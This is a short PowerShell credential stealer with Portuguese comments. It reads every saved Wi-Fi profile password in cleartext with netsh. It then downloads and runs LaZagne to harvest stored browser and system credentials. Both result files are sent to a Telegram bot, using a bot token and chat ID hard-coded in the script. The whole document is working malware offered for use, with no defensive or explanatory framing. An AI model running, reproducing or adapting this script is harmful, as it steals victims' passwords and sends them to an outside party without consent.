# Coletar senhas Wi-Fi
$wifiOutput = ""
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

foreach ($profile in $profiles) {
    $result = netsh wlan show profile name="$profile" key=clear
    $keyLine = ($result | Select-String "Key Content")
    $pass = if ($keyLine) { ($keyLine -split ":")[1].Trim() } else { "Sem senha encontrada" }
    $wifiOutput += "`n$profile : $pass"
}
$wifiFile = "$env:TEMP\wifi.txt"
$wifiOutput | Out-File $wifiFile

# Baixar LaZagne
$laZagneURL = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
$laZagnePath = "$env:TEMP\lazagne.exe"
Invoke-WebRequest -Uri $laZagneURL -OutFile $laZagnePath -UseBasicParsing

# Executar LaZagne e salvar output
$browserFile = "$env:TEMP\browser.txt"
Start-Process -FilePath $laZagnePath -ArgumentList "all" -NoNewWindow -Wait -RedirectStandardOutput $browserFile
Start-Sleep -Seconds 3

# Enviar arquivos para o Telegram
$token = "7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw"
$chatid = "5400490425"

Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendDocument" -Method Post -Form @{
    chat_id = $chatid
    document = Get-Item $wifiFile
}

Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendDocument" -Method Post -Form @{
    chat_id = $chatid
    document = Get-Item $browserFile
}

